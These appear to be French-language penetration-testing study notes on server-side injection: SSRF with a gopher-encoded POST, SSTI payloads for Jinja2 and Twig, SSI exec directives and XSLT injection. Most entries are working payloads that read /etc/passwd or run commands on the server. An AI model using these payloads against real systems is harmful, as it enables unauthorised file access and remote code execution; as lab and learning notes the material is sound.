## Server-side request forgery (SSRF)
Quand une application rapporte des ressources d'un endroit distant basé sur une entrée utilisateur.
* `http:\\`, `https:\\`
* `file:\\` lire des fichiers
* `gopher:­\\` envoyer des requêtes POST ou autre (SMTP, ... ). Créer une requête POST normale et URL encode tous charactère spécial.
```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
[Gopherus](https://github.com/Esonhugh/Gopherus3) pour automatiser


## Server-side Template Injection (SSTI)
Code doit être injecté **avant le rendu** pour qu'il soit exécuté lors de la phase de rendu.
Détection: `${{<%[%'"}}%\.` devrait violer la syntaxe du template.
[PayloadAllTheThings CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
![[diagram.webp]]

Jinja = 777777
twig =49

### Jinja2
```jinja2
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
### Twig
Attention aux espaces. Utiliser `\x20` dans les strings.
```twig
{{_self}}
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ ['id'] | filter('system') }}
```
### Outils
[SSTImap](https://github.com/vladko312/SSTImap)

## Server-side includes (SSI) Injection
SSI permet de générer du contenu dynamique. Doit pouvoir injecter des directives dans les fichiers.
`<!--#printenv -->`
`<!--#exec cmd="id" -->`

## eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
Opère sur des données XML. noeuds commencant par xsl `<xsl:template>`

Peut être détecté par `<`
```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />

#Lecture de fichiers XSLT 2.0
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
#Lecture si supporte PHP
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
#RCE PHP
<xsl:value-of select="php:function('system','id')" />
```